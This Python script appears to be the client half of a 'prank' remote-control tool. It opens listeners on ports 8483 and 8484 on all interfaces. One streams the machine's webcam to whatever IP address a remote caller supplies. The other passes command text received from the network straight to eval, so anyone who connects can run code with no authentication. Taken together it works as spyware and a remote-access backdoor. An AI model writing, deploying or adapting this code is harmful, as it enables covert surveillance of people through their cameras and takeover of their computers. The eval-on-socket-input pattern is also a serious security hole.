


try:
	import sys
	import time
	import cv2
	import io
	import socket
	import struct
	import time
	import pickle
	import zlib
	import random
	import threading
	from prankcommands import availableCommands
except Exception as e:
	print(e)
	input()
#Start webcam Server
def startWebcamServer():
	while True:
		try:
			s = socket.socket()
			port = 8484        
			s.bind(('0.0.0.0', port))     
 
			  
			# put the socket into listening mode 
			s.listen(5)            
			while True: 

				c, addr = s.accept()      

				ip = c.recv(1024).decode()
				print("Webcam connection from", addr)
				c.close()
				break
			client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			client_socket.connect((ip, 8485))
			#client_socket.connect(('127.0.0.1', 8485))
			connection = client_socket.makefile('wb')

			cam = cv2.VideoCapture(0)

			cam.set(3, 320);
			cam.set(4, 240);

			img_counter = 0

			encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

			while True:
			    ret, frame = cam.read()
			    result, frame = cv2.imencode('.jpg', frame, encode_param)
			#    data = zlib.compress(pickle.dumps(frame, 0))
			    data = pickle.dumps(frame, 0)
			    size = len(data)


			    client_socket.sendall(struct.pack(">L", size) + data)
			    img_counter += 1

			cam.release()
		except Exception as e:
			print(e)
def functionListener():          
	while True: 
		try:
			s = socket.socket()
			port = 8483        
			s.bind(('0.0.0.0', port))     
			s.listen(5)
			s, addr = s.accept()      
			print('Command connection from:', addr) 
			command = s.recv(1024).decode()
			commandParts = command.split(",")
			function = commandParts[0]
			commandParts.pop(0)
			commandParts.pop(-1)
			args = commandParts
			print("Received command:",function, args)
			#eval(function)(*args)
			thread = threading.Thread(target=eval(function), args=args)
			thread.start()
			s.close()
		except Exception as e:
			print(e)
webcamThread = threading.Thread(target=startWebcamServer)
webcamThread.start()
functionListener()




